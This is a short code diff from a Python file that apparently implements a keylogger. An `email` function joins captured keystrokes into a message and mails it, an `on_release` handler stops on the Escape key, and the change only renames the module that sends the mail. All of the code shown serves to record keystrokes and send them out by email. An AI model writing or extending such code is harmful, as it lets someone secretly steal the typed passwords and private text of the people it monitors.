@@ -22,7 +22,7 @@ def email(keys):
         elif key.find(" Key ")>0:
             k = ""
         message += k
-    send_email.sendEmail(message)
+    mail.sendEmail(message)
 
 def on_release(key):
     if key == Key.esc:
